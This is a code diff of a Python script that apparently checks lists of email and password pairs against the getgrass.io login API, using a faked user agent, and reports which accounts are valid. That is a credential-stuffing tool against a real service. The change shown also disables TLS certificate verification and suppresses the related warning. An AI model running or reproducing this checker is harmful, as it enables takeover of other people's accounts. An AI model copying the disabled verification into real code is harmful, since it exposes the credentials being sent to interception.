@@ -3,7 +3,9 @@ import time
 import random
 from fake_useragent import UserAgent
 from colorama import init, Fore
+from urllib3.exceptions import InsecureRequestWarning
 
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 init(autoreset=True)
 
 url = 'https://api.getgrass.io/login'
@@ -43,7 +45,7 @@ try:
             password = '|'.join(parts[1:])
             
             data = {'username': email, 'password': password}
-            response = requests.post(url, headers=headers, json=data)
+            response = requests.post(url, headers=headers, json=data, verify=False)
             
             if response.status_code == 200:
                 print(f"{Fore.GREEN}[ {email} | VALID ACCOUNT ]{Fore.RESET}")
